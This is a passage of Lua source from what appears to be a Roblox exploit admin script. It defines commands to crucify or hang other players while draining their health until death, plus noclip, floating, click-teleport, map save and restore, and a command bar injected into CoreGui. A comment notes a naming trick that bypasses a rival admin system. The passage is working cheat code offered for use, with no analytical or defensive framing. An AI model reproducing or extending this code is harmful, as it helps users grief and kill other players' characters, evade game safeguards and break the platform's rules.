if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
fm:Clone().Parent = v
end end end end)

addcmd('crucify','crucifies a player',{'cruci'},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players)do
local char = gPlayers[v].Character
		local torso=char['Torso']
		local larm=char['Left Arm']
		local rarm=char['Right Arm']
		local lleg=char['Left Leg']
		local rleg=char['Right Leg']
		local head=char['Head']
		if torso and larm and rarm and lleg and rleg and head and not char:FindFirstChild(char.Name..'epixcrusify') then
			local cru=Instance.new('Model',char)
			cru.Name=char.Name..'epixcrusify' -- Leave it like that so it bypasses epixcommands ;)
			local c1=Instance.new('Part',cru)
			c1.BrickColor=BrickColor.new('Reddish brown')
			c1.Material='Wood'
			c1.CFrame=(char.Torso.CFrame-char.Torso.CFrame.lookVector)*CFrame.new(0,0,2)
			c1.Size=Vector3.new(2,18.4,1)
			c1.Anchored=true
			local c2=c1:Clone()
			c2.Parent=cru
			c2.Size=Vector3.new(11,1.6,1)
			c2.CFrame=c1.CFrame+Vector3.new(0,5,0)
			torso.Anchored=true;wait(0.5)
			torso.CFrame=c2.CFrame+torso.CFrame.lookVector+Vector3.new(0,-1,0);wait(0.5)
			larm.Anchored=true
			rarm.Anchored=true
			lleg.Anchored=true
			rleg.Anchored=true
			head.Anchored=true;wait()
			larm.CFrame=torso.CFrame*CFrame.new(-1.5,1,0)
			rarm.CFrame=torso.CFrame*CFrame.new(1.5,1,0)
			lleg.CFrame=torso.CFrame*CFrame.new(-0.1,-1.7,0)
			rleg.CFrame=torso.CFrame*CFrame.new(0.1,-1.7,0)
			larm.CFrame=larm.CFrame*CFrame.Angles(0,0,-140)
			rarm.CFrame=rarm.CFrame*CFrame.Angles(0,0,140)
			lleg.CFrame=lleg.CFrame*CFrame.Angles(0,0,0.6)
			rleg.CFrame=rleg.CFrame*CFrame.Angles(0,0,-0.6)
			--head.CFrame=head.CFrame*CFrame.Angles(0,0,0.3)
			local n1=Instance.new('Part',cru)
			n1.BrickColor=BrickColor.new('Dark stone grey')
			n1.Material='DiamondPlate'
			n1.Size=Vector3.new(0.2,0.2,2)
			n1.Anchored=true
			local m=Instance.new('BlockMesh',n1)
			m.Scale=Vector3.new(0.2,0.2,0.7)
			local n2=n1:Clone()
			n2.Parent=cru
			local n3=n1:Clone()
			n3.Parent=cru
			n1.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(2,0,0)
			n2.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(-2,0,0)
			n3.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(0,-3,0)
			spawn(function()
				repeat
					wait(0.1)
					char.Humanoid.Health=char.Humanoid.Health-0.6
				until (not cru) or (not cru.Parent) or (not v) or (not char) or (not char:FindFirstChild('Head')) or char.Humanoid.Health<=0
				char:BreakJoints()
			end)
		end
	end
end)

addcmd('hang','hangs a player',{},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players)do
local plr = gPlayers[v].Character
plr.HumanoidRootPart.Anchored = true
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
local Model0 = Instance.new("Model")
local Part1 = Instance.new("Part")
local Part2 = Instance.new("Part")
local Part3 = Instance.new("Part")
local Part4 = Instance.new("Part")
local Part5 = Instance.new("Part")
local Motor6D6 = Instance.new("Motor6D")
local Part7 = Instance.new("Part")
local Part8 = Instance.new("Part")
local Part9 = Instance.new("Part")
local Part10 = Instance.new("Part")
local Part11 = Instance.new("Part")
local Part12 = Instance.new("Part")
local Part13 = Instance.new("Part")
local Part14 = Instance.new("Part")
local Part15 = Instance.new("Part")
Model0.Name = "hang"
Model0.Parent = mas
Part1.Parent = Model0
Part1.Material = Enum.Material.SmoothPlastic
Part1.BrickColor = BrickColor.new("Reddish brown")
Part1.Anchored = true
Part1.Size = Vector3.new(0.200000003, 0.200000003, 0.600000024)
Part1.CFrame = CFrame.new(1.539994, 9.29992199, 12.6999884, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part1.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part1.Position = Vector3.new(1.539994, 9.29992199, 12.6999884)
Part1.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part2.Parent = Model0
Part2.Material = Enum.Material.Wood
Part2.BrickColor = BrickColor.new("Pine Cone")
Part2.Anchored = true
Part2.Size = Vector3.new(0.49999997, 0.200000003, 0.200000003)
Part2.CFrame = CFrame.new(1.44999003, 9.09992599, 12.6999884, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part2.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part2.Position = Vector3.new(1.44999003, 9.09992599, 12.6999884)
Part2.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part3.Parent = Model0
Part3.Material = Enum.Material.Wood
Part3.BrickColor = BrickColor.new("Pine Cone")
Part3.Anchored = true
Part3.Size = Vector3.new(1, 9.39999962, 0.599999964)
Part3.CFrame = CFrame.new(-0.100001998, 4.70001078, 12.6999884, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part3.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part3.Position = Vector3.new(-0.100001998, 4.70001078, 12.6999884)
Part3.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part4.Parent = Model0
Part4.Material = Enum.Material.Wood
Part4.BrickColor = BrickColor.new("Pine Cone")
Part4.Anchored = true
Part4.Size = Vector3.new(1, 0.599999845, 0.599999964)
Part4.CFrame = CFrame.new(0.899998009, 9.09995365, 12.6999884, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part4.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part4.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part4.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part4.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part4.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part4.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part4.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part4.Position = Vector3.new(0.899998009, 9.09995365, 12.6999884)
Part4.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part5.Name = "main"
Part5.Parent = Model0
Part5.BrickColor = BrickColor.new("Bright blue")
Part5.Transparency = 1
Part5.Rotation = Vector3.new(0, -90, 0)
Part5.Anchored = true
Part5.CanCollide = false
Part5.FormFactor = Enum.FormFactor.Symmetric
Part5.Size = Vector3.new(2, 2, 1)
Part5.CFrame = CFrame.new(1.98998594, 6.33001804, 12.7000237, 0, 0, -1, 0, 1, 0, 1, 0, 0)
Part5.BottomSurface = Enum.SurfaceType.Smooth
Part5.TopSurface = Enum.SurfaceType.Smooth
Part5.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part5.Position = Vector3.new(1.98998594, 6.33001804, 12.7000237)
Part5.Orientation = Vector3.new(0, -90, 0)
Part5.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Motor6D6.Name = "RootJoint"
Motor6D6.Parent = Part5
Motor6D6.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
Motor6D6.C1 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
Motor6D6.Part0 = Part5
Motor6D6.MaxVelocity = 0.10000000149012
Part7.Parent = Model0
Part7.Material = Enum.Material.SmoothPlastic
Part7.BrickColor = BrickColor.new("Reddish brown")
Part7.Rotation = Vector3.new(90, 75, -180)
Part7.Anchored = true
Part7.Size = Vector3.new(0.200000003, 0.200000003, 0.800000012)
Part7.CFrame = CFrame.new(2.02295995, 7.37058878, 12.1000061, -0.258818984, 0, 0.965925872, -0.965925872, 0, -0.258818984, 0, -1, 0)
Part7.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part7.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part7.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part7.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part7.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part7.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part7.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part7.Position = Vector3.new(2.02295995, 7.37058878, 12.1000061)
Part7.Orientation = Vector3.new(15, 90, -90)
Part7.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part8.Parent = Model0
Part8.Material = Enum.Material.Wood
Part8.BrickColor = BrickColor.new("Pine Cone")
Part8.Anchored = true
Part8.Size = Vector3.new(0.200000003, 0.599999785, 0.599999964)
Part8.CFrame = CFrame.new(1.77999604, 9.09992599, 12.6999884, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part8.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part8.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part8.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part8.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part8.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part8.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part8.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part8.Position = Vector3.new(1.77999604, 9.09992599, 12.6999884)
Part8.Color = Color3.new(0.423529, 0.345098, 0.294118)
Part9.Parent = Model0
Part9.Material = Enum.Material.SmoothPlastic
Part9.BrickColor = BrickColor.new("Reddish brown")
Part9.Rotation = Vector3.new(90, 75, -180)
Part9.Anchored = true
Part9.Size = Vector3.new(0.200000003, 0.200000003, 0.800000012)
Part9.CFrame = CFrame.new(2.02295995, 7.37058878, 13.299984, -0.258818984, 0, 0.965925872, -0.965925872, 0, -0.258818984, 0, -1, 0)
Part9.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part9.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part9.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part9.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part9.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part9.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part9.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part9.Position = Vector3.new(2.02295995, 7.37058878, 13.299984)
Part9.Orientation = Vector3.new(15, 90, -90)
Part9.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part10.Parent = Model0
Part10.Material = Enum.Material.SmoothPlastic
Part10.BrickColor = BrickColor.new("Reddish brown")
Part10.Anchored = true
Part10.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
Part10.CFrame = CFrame.new(1.539994, 9.09992599, 12.8999901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part10.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part10.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part10.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part10.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part10.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part10.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part10.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part10.Position = Vector3.new(1.539994, 9.09992599, 12.8999901)
Part10.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part11.Parent = Model0
Part11.Material = Enum.Material.SmoothPlastic
Part11.BrickColor = BrickColor.new("Reddish brown")
Part11.Anchored = true
Part11.Size = Vector3.new(0.200000003, 1.4000001, 0.200000003)
Part11.CFrame = CFrame.new(1.539994, 8.09998417, 12.6999884, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part11.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part11.Position = Vector3.new(1.539994, 8.09998417, 12.6999884)
Part11.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part12.Parent = Model0
Part12.Material = Enum.Material.SmoothPlastic
Part12.BrickColor = BrickColor.new("Reddish brown")
Part12.Rotation = Vector3.new(90, 75, -180)
Part12.Anchored = true
Part12.Size = Vector3.new(0.200000003, 1.4000001, 0.200000003)
Part12.CFrame = CFrame.new(2.50592208, 7.24118423, 12.6999884, -0.258818984, 0, 0.965925872, -0.965925872, 0, -0.258818984, 0, -1, 0)
Part12.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part12.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part12.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part12.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part12.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part12.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part12.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part12.Position = Vector3.new(2.50592208, 7.24118423, 12.6999884)
Part12.Orientation = Vector3.new(15, 90, -90)
Part12.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part13.Parent = Model0
Part13.Material = Enum.Material.SmoothPlastic
Part13.BrickColor = BrickColor.new("Reddish brown")
Part13.Anchored = true
Part13.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
Part13.CFrame = CFrame.new(1.539994, 9.09992599, 12.4999962, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part13.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part13.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part13.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part13.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part13.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part13.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part13.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part13.Position = Vector3.new(1.539994, 9.09992599, 12.4999962)
Part13.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part14.Parent = Model0
Part14.Material = Enum.Material.SmoothPlastic
Part14.BrickColor = BrickColor.new("Reddish brown")
Part14.Rotation = Vector3.new(90, 75, -180)
Part14.Anchored = true
Part14.Size = Vector3.new(0.200000003, 1.4000001, 0.200000003)
Part14.CFrame = CFrame.new(1.539994, 7.49999714, 12.6999884, -0.258818984, 0, 0.965925872, -0.965925872, 0, -0.258818984, 0, -1, 0)
Part14.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part14.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part14.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part14.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part14.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part14.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part14.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part14.Position = Vector3.new(1.539994, 7.49999714, 12.6999884)
Part14.Orientation = Vector3.new(15, 90, -90)
Part14.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part15.Parent = Model0
Part15.Material = Enum.Material.SmoothPlastic
Part15.BrickColor = BrickColor.new("Reddish brown")
Part15.Anchored = true
Part15.Size = Vector3.new(0.200000003, 0.200000003, 0.600000024)
Part15.CFrame = CFrame.new(1.539994, 8.89993, 12.6999884, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part15.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part15.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part15.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part15.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part15.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part15.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part15.Color = Color3.new(0.411765, 0.25098, 0.156863)
Part15.Position = Vector3.new(1.539994, 8.89993, 12.6999884)
Part15.Color = Color3.new(0.411765, 0.25098, 0.156863)
for i,v in pairs(mas:GetChildren()) do
	v.Parent = workspace
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
			hang = Model0
			hang.Parent = plr
			hang:MoveTo(plr.Torso.Position-Vector3.new(0,0,5))
			pcall(function()
			plr.HumanoidRootPart.CFrame = hang.main.CFrame
			function weld(p, cf)
			local weld1 = Instance.new("Weld") 
			weld1.Part0 = p
			weld1.Part1 = plr.Torso
			weld1.C0 = CFrame.new()
			weld1.C1 = cf
			weld1.Parent = p
			end
			weld(plr["Right Arm"], CFrame.new(0.8,0.3,-0.6) * CFrame.Angles(0, 0.5, 4))
			weld(plr["Left Arm"], CFrame.new(-0.8,0.3,-0.6) * CFrame.Angles(0, -0.5, -4))
			spawn(function()
				repeat
					wait(0.1)
					plr.Humanoid.Health=plr.Humanoid.Health-0.6
				until (not hang) or (not hang.Parent) or (not v) or (not plr) or (not plr:FindFirstChild('Head')) or plr.Humanoid.Health<=0
				plr:BreakJoints()
			end)
			end)
		end
end)

addcmd('fix', 'restores lighting and what not',{},
function(args, speaker)
LightingService.Ambient = origsettings.abt
LightingService.OutdoorAmbient = origsettings.oabt
LightingService.Brightness = origsettings.brt
LightingService.TimeOfDay = origsettings.time
LightingService.FogColor = origsettings.fclr
LightingService.FogEnd = origsettings.fe
LightingService.FogStart = origsettings.fs
playinggif = false
workspace.Gravity = 200
local function dels(instance) for i,v in pairs(instance:GetChildren())do if v:IsA'Sound'then v:Destroy()end dels(v) end end dels(workspace)
for i,v in pairs(LightingService:GetChildren()) do if v:IsA('Sky') then v:Destroy() end end
    for i,v in pairs(game:GetService("Lighting"):GetChildren()) do
    if v:IsA("PostEffect") then v:Destroy() end end
for i,v in pairs(workspace.Terrain:GetChildren()) do v:Destroy() Notify('Reset') end end)

Floating = false

addcmd('float', 'makes player float',{},
function(args,speaker)
	Floating = true
	local players = getPlayer(args[1], speaker)
	for _,v in pairs(players) do
		local pchar = gPlayers[v].Character
		if gPlayers[v] and pchar and not pchar:FindFirstChild("Float") then
			spawn(function()
				local float = DATA.Float:Clone()
				float.Parent = pchar
				float.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
				spawn(function()
					while wait(0.1) do
						if pchar:FindFirstChild("Float") then
							float.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
						else
							break
						end
					end
				end)
			end)
		end
	end
end)

addcmd('unfloat','disables floating',{},
function(args, speaker)
	Floating = false
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("Float") then
		    pchar.Float:Destroy()
	    end
	end
end)

runningnoclip = false
Clip = true
addcmd('noclip','noclip',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
Notify('Noclip enabled')
Clip = false
if LP.Character:FindFirstChild('Torso') then
	wait(0.1)
	if runningnoclip == false then runningnoclip = true
	game:GetService('RunService').Stepped:connect(function ()
	if Clip == false and LP.Character ~= nil then
    for _, child in pairs( LP.Character:GetDescendants()) do
	if child.ClassName == 'Part' and child.CanCollide == true then
    child.CanCollide = false
	end end end end) end
else
	r15noclip = true
end
end
end)

addcmd('clip','clip',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
	Notify('Noclip disabled')
	Clip = true
	r15noclip = false
	wait(0.1)
	if LP.Character ~= nil then
	LP.Character.Torso.CanCollide = true
    LP.Character.Head.CanCollide = true
end end end)

addcmd('prefix','changes prefix',{},
function(args, speaker)
	cmdprefix = args[1]
	Notify('Set prefix to "' .. args[1] .. '"')
	updatefile()
end)

logsopen = false
addcmd('logs','shows logs',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
if logsopen == false then logsopen = true
logdrag:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil)
end
end
end)

local Saved = {}

RestorePoint = function()
    Saved = {}
    for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
        v.Archivable = true;
    end
    for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
        if not v:IsA("Terrain") and not v:IsA("Camera") then
            if not game:GetService("Players"):FindFirstChild(v.Name) then
                table.insert(Saved, v:Clone());
            end
        elseif v:IsA("Terrain") then
            Saved.Terrain = game:GetService("Workspace").Terrain:CopyRegion(game:GetService("Workspace").Terrain.MaxExtents);
        end
    end
    return Saved;
end

InsertPoint = function()
    if #Saved == 0 and not Saved.Terrain then
        return false;
    end
    for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
        if not v:IsA("Camera") and not v:IsA("Terrain") then
            if not game:GetService("Players"):FindFirstChild(v.Name) then
                pcall(function()
                    v:Destroy()
                end)
            end
        elseif v:IsA("Terrain") then
            v:Clear()
        end
    end
    for i, v in ipairs(Saved) do
		v:Clone().Parent = workspace;
    end
    game:GetService("Workspace").Terrain:PasteRegion(Saved.Terrain, game:GetService("Workspace").Terrain.MaxExtents.Min, true);
end

addcmd('savemap','saves current map',{'smap'},
function(args, speaker)
RestorePoint()
Notify('Saved current map')
end)

addcmd('restoremap','saves current map',{'rmap'},
function(args, speaker)
InsertPoint()
Notify('Loaded last saved map')
end)

addcmd('respawn','respawns',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
	respawn(gPlayers[v])
	end
end)

addcmd('version','shows version',{''},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
	Notify("Version is " .. Version)
end
end)
local CTPenabled = false
Mouse.KeyDown:connect(function (Key)
	if Key:byte() == 29 then
		if FLYING == false then
			execCmd("fly me", Player)
		elseif FLYING == true then
			execCmd("unfly me", Player)
		end
	end
	if Key:byte() == 30 then
		if Clip == true then
			execCmd("noclip", Player)
		elseif Clip == false then
			execCmd("clip", Player)
		end
	end
	Key = Key:lower()
	if Key:byte() == 27 then
		CTPenabled = true
	end
end)
Mouse.KeyUp:connect(function(Key)
	Key = Key:lower()
	if Key:byte() == 27 then
		CTPenabled = false
	end
end)
Mouse.Button1Down:connect(function()
	local charx = gPlayers.LocalPlayer.Character
	if charx and CTPenabled == true then
		charx.HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0,7,0)
	end
end)

CMDbar = Instance.new('ScreenGui', game.CoreGui)
CMDbar.Name = 'GUI'
CMDbar.DisplayOrder = 2
cont = Instance.new("Frame")
cmdBAR = Instance.new('TextBox', cont)
cont.Name = "cont"
cont.BackgroundTransparency = 1
cont.Position = UDim2.new(1, -265, 0, -75)
cont.Size = UDim2.new(0, 270, 0, 45)
cont.Parent = CMDbar
cont.ZIndex = 5
cont.Active = true
dragGUI(cont)
cmdBAR.Name = "CMDbar"
cmdBAR.Parent = cont
cmdBAR.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
cmdBAR.BackgroundTransparency = 0.7
cmdBAR.BorderColor3 = Color3.new(0.972549, 0.972549, 0.972549)
cmdBAR.BorderSizePixel = 0
cmdBAR.Position = UDim2.new(0, 10, 1, -35)
cmdBAR.Size = UDim2.new(0, 250, 0, 25)
cmdBAR.Font = Enum.Font.SourceSans
cmdBAR.FontSize = Enum.FontSize.Size18
cmdBAR.Text = 'Press ' ..cmdbarbind.. ' to focus the cmd bar'
cmdBAR.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
cmdBAR.ZIndex = 5
DATA = Instance.new('Folder', game.ContextActionService)
DATA.Name = 'Data'
Paper = Instance.new('BlockMesh', DATA)
Paper.Name = 'Paper'
Paper.Scale = Vector3.new(1,1,0.1)
ayylmao = Instance.new('Hat', DATA)
ayylmao.Name = 'ayylmao'
ayyHandle = Instance.new('Part', ayylmao)
ayyHandle.Name = 'Handle'
ayyHandle.Size = Vector3.new(2,2.4,2)
ayyHandle.FormFactor = 'Plate'
ayyMesh = Instance.new('SpecialMesh', ayyHandle)
ayyMesh.Scale = Vector3.new(1,1.02,1)
ayyMesh.MeshType = 'FileMesh'
ayyMesh.MeshId = 'http://www.roblox.com/asset/?id=13827689'
ayyMesh.TextureId = 'http://www.roblox.com/asset/?id=13827796'
Float = Instance.new('Part', DATA)
Float.Name = 'Float'
Float.Transparency = 1
Float.Size = Vector3.new(6,1,6)
Float.Anchored = true
function C3(R, G, B) return Color3.new(R/255, G/255, B/255) end
missile = Instance.new('Part', DATA)
missile.Name = 'IY_missile'
missile.CanCollide = false
missile.Size = Vector3.new(2, 5, 2) 
Instance.new('CylinderMesh', missile)
local F = Instance.new('Part', missile)
F.BrickColor = BrickColor.new('Black')
F.CanCollide = false
F.Size = Vector3.new(2, 0.2, 2)
Instance.new('CylinderMesh', F)
local fire = Instance.new('Fire', F)
fire.Size = "15"
fire.Heat = "25"
local head = Instance.new('Part', missile)
head.CanCollide = false
head.Shape = 'Ball'
head.Size = Vector3.new(2, 2, 2)
head.TopSurface = 'Smooth'
head.BottomSurface = 'Smooth'
local BF = Instance.new('BodyForce', missile)
BF.Name = 'force'
BF.Force = Vector3.new(0, 0, 0)
local W1 = Instance.new('Weld', missile)
W1.Part0 = missile
W1.Part1 = F
W1.C1 = CFrame.new(0, 2.6, 0)
local W2 = Instance.new('Weld', missile)
W2.Part0 = missile
W2.Part1 = head
W2.C1 = CFrame.new(0, -2.6, 0)
	jail = Instance.new('Model', DATA)
	jail.Name = 'JAIL'
		local B = Instance.new('Part', jail)
		B.Name = 'BUTTOM'
		B.BrickColor = BrickColor.new('Black')
		B.Transparency = 0.5
		B.Anchored = true
		B.Locked = true
		B.Size = Vector3.new(6, 1, 6)
		B.TopSurface = 'Smooth'
		B.BottomSurface = 'Smooth'
		local M = Instance.new('Part', jail)
		M.Name = 'MAIN'
		M.BrickColor = BrickColor.new('Black')
		M.Transparency = 1
		M.Anchored = true
		M.CanCollide = false
		M.Locked = true
		M.Position = B.Position + Vector3.new(0, 3, 0)
		M.Size = Vector3.new(1, 1, 1)
		local P1 = Instance.new('Part', jail)
		P1.BrickColor = BrickColor.new('Black')
		P1.Transparency = 0.5
		P1.Position = B.Position + Vector3.new(0, 3.5, -2.5)
		P1.Rotation = Vector3.new(0, 90, 0)
		P1.Anchored = true
		P1.Locked = true
		P1.Size = Vector3.new(1, 6, 6)
		local P2 = Instance.new('Part', jail)
		P2.BrickColor = BrickColor.new('Black')
		P2.Transparency = 0.5
		P2.Position = B.Position + Vector3.new(-2.5, 3.5, 0)
		P2.Rotation = Vector3.new(-180, 0, -180)
		P2.Anchored = true
		P2.Locked = true
		P2.Size = Vector3.new(1, 6, 4)
		local P3 = Instance.new('Part', jail)
		P3.BrickColor = BrickColor.new('Black')
		P3.Transparency = 0.5
		P3.Position = B.Position + Vector3.new(2.5, 3.5, 0)
		P3.Rotation = Vector3.new(0, 0, 0)
		P3.Anchored = true
		P3.Locked = true
		P3.Size = Vector3.new(1, 6, 4)
		local P4 = Instance.new('Part', jail)
		P4.BrickColor = BrickColor.new('Black')
		P4.Transparency = 0.5
		P4.Position = B.Position + Vector3.new(0, 3.5, 2.5)
		P4.Rotation = Vector3.new(0, 90, 0)
		P4.Anchored = true
		P4.Locked = true
		P4.Size = Vector3.new(1, 6, 6)
		local TOP = Instance.new('Part', jail)
		TOP.BrickColor = BrickColor.new('Black')
		TOP.Transparency = 0.5
		TOP.Position = B.Position + Vector3.new(0, 7, 0)
		TOP.Rotation = Vector3.new(0, 0, 0)
		TOP.Anchored = true
		TOP.Locked = true
		TOP.Size = Vector3.new(6, 1, 6)
		TOP.TopSurface = 'Smooth'
		TOP.BottomSurface = 'Smooth'
cp = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local holder = Instance.new("Frame")
bar = Instance.new("Frame")
local cmds = Instance.new("TextButton")
local settings = Instance.new("TextButton")
local Hide = Instance.new("TextButton")
local Exit = Instance.new("TextButton")
FeedbackMain = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local checkboxText = Instance.new("TextLabel")
local CheckBox = Instance.new("ImageButton")
local bindInput = Instance.new("TextButton")
Input = Instance.new("TextBox")
local preText = Instance.new("TextLabel")
local setpre = Instance.new("TextButton")
local everyone = Instance.new("TextButton")
local JLtext = Instance.new("TextLabel")
local CheckBoxJL = Instance.new("ImageButton")
local friends = Instance.new("TextButton")
local InputBox = Instance.new("TextButton")
